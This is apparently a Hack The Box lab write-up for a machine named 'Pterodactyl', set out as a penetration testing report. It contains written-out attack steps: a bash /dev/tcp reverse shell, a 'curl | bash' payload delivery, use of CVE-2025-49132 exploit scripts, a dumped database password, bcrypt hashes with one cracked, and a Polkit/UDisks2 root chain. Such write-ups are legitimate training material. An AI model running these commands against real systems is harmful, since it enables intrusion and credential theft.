PENETRATION TESTING REPORT: PTERODACTYL
========================================

1. RECONNAISSANCE & SUBDOMAIN ENUMERATION [cite: 169]
-----------------------------------------
Target: pterodactyl.htb
Tool: ffuf

Command:
ffuf -u http://10.129.5.199/ -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145 [cite: 169]

Result: Found panel.pterodactyl.htb. [cite: 169]

2. INITIAL ACCESS (CVE-2025-49132) [cite: 169]
----------------------------------
Vulnerability: Remote Code Execution (RCE) via CVE-2025-49132. [cite: 169]

Verification:
curl -v "http://panel.pterodactyl.htb/locales/locale.json" [cite: 169]

Exploitation (str1keboo method):
1. git clone https://github.com/str1keboo/CVE-2025-49132/blob/ [cite: 169]
2. python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb [cite: 169]
3. python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb [cite: 169]

Establishing Interactive Shell (malw0re method):
1. git clone https://github.com/malw0re/CVE-2025-49132-Mods/blob/main/ [cite: 169]
2. python3 x.py --host panel.pterodactyl.htb --interactive [cite: 169]

Reverse Shell Setup:
- Attacker Listener: nc -lvnp 6XXX [cite: 169]
- Payload Creation: echo 'bash -i >& /dev/tcp/10.10.X.X/4XXX 0>&1' > XXX.sh [cite: 169]
- Delivery: curl http://10.X.X.X:4XX/XXXX.sh | bash [cite: 169, 170]

3. POST-EXPLOITATION ENUMERATION (wwwrun) [cite: 86]
-----------------------------------------
Tool: Linux Smart Enumeration (LSE) [cite: 87]
Findings:
- Database Credentials (from .env): pterodactyl:PteraPanel [cite: 101]
- DB_DATABASE: panel [cite: 101]
- Polkit Presence: polkitd:!:478 [cite: 92]

4. DATABASE EXTRACTION [cite: 114]
----------------------
Command:
mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel panel [cite: 170]

Extracted Hashes: [cite: 108]
- headmonitor: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
- phileasfogg3: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi

5. LATERAL MOVEMENT [cite: 114]
-------------------
User: phileasfogg3
Cracked Password: !QAZ2wsx [cite: 121]
Method: SSH login [cite: 121]

User Flag (user.txt): 90f9d4ef4d1dac6f39d6943982a619ec [cite: user prompt]

6. PRIVILEGE ESCALATION (ROOT) [cite: 132]
------------------------------
Chain: CVE-2025-6018 (Polkit) + CVE-2025-6019 (UDisks2) [cite: 132]

Step 1: Polkit Session Bypass [cite: 132]
Commands:
echo "XDG_SEAT=seat0" >> ~/.pam_environment [cite: 134]
echo "XDG_VTNR=1" >> ~/.pam_environment [cite: 134]

Step 2: UDisks2 Race Condition [cite: 144]
Exploit Files: exploit.img (XFS), catcher (C binary), exploit.sh [cite: 144, 164]
Command: ./exploit.sh [cite: 165]

Result:
whoami -> root [cite: 168]
Root Flag (root.txt): c6d1c570e4d8bc2e3804e370a53eb03ea [cite: uploaded image]
========================================